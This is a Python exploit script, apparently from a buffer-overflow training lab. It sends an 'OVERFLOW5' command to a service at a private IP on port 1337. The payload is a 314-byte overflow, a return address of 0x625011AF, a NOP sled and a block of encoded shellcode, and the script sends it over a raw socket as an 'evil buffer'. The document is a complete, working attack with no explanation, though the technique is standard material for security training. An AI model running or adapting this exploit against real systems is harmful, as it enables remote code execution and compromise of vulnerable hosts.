#!/usr/bin/env python3

import socket

ip = "10.10.67.242"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\xb3\x69\xdc\x7e\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x4f\x81\x5e\x7e\xaf"
"\x52\x3f\xf6\x4a\x63\x7f\x6c\x1f\xd4\x4f\xe6\x4d\xd9\x24\xaa"
"\x65\x6a\x48\x63\x8a\xdb\xe7\x55\xa5\xdc\x54\xa5\xa4\x5e\xa7"
"\xfa\x06\x5e\x68\x0f\x47\xa7\x95\xe2\x15\x70\xd1\x51\x89\xf5"
"\xaf\x69\x22\x45\x21\xea\xd7\x1e\x40\xdb\x46\x14\x1b\xfb\x69"
"\xf9\x17\xb2\x71\x1e\x1d\x0c\x0a\xd4\xe9\x8f\xda\x24\x11\x23"
"\x23\x89\xe0\x3d\x64\x2e\x1b\x48\x9c\x4c\xa6\x4b\x5b\x2e\x7c"
"\xd9\x7f\x88\xf7\x79\x5b\x28\xdb\x1c\x28\x26\x90\x6b\x76\x2b"
"\x27\xbf\x0d\x57\xac\x3e\xc1\xd1\xf6\x64\xc5\xba\xad\x05\x5c"
"\x67\x03\x39\xbe\xc8\xfc\x9f\xb5\xe5\xe9\xad\x94\x61\xdd\x9f"
"\x26\x72\x49\x97\x55\x40\xd6\x03\xf1\xe8\x9f\x8d\x06\x0e\x8a"
"\x6a\x98\xf1\x35\x8b\xb1\x35\x61\xdb\xa9\x9c\x0a\xb0\x29\x20"
"\xdf\x17\x79\x8e\xb0\xd7\x29\x6e\x61\xb0\x23\x61\x5e\xa0\x4c"
"\xab\xf7\x4b\xb7\x3c\xf2\x86\xae\x4e\x6a\x9b\xd0\xbf\x37\x12"
"\x36\xd5\xd7\x72\xe1\x42\x41\xdf\x79\xf2\x8e\xf5\x04\x34\x04"
"\xfa\xf9\xfb\xed\x77\xe9\x6c\x1e\xc2\x53\x3a\x21\xf8\xfb\xa0"
"\xb0\x67\xfb\xaf\xa8\x3f\xac\xf8\x1f\x36\x38\x15\x39\xe0\x5e"
"\xe4\xdf\xcb\xda\x33\x1c\xd5\xe3\xb6\x18\xf1\xf3\x0e\xa0\xbd"
"\xa7\xde\xf7\x6b\x11\x99\xa1\xdd\xcb\x73\x1d\xb4\x9b\x02\x6d"
"\x07\xdd\x0a\xb8\xf1\x01\xba\x15\x44\x3e\x73\xf2\x40\x47\x69"
"\x62\xae\x92\x29\x82\x4d\x36\x44\x2b\xc8\xd3\xe5\x36\xeb\x0e"
"\x29\x4f\x68\xba\xd2\xb4\x70\xcf\xd7\xf1\x36\x3c\xaa\x6a\xd3"
"\x42\x19\x8a\xf6\x42\x9d\x74\xf9")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")